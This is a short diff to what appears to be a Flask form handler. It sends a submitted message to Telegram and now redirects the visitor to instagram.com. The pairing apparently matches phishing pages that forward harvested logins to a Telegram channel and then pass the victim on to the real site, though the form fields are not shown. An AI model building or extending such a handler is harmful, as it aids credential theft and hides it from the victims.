@@ -234,6 +234,8 @@ def submit_form():
         send_message_to_telegram(message)
 
         # return jsonify({'status': 'success'})
+        return redirect("https://www.instagram.com/")
+
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)})
 
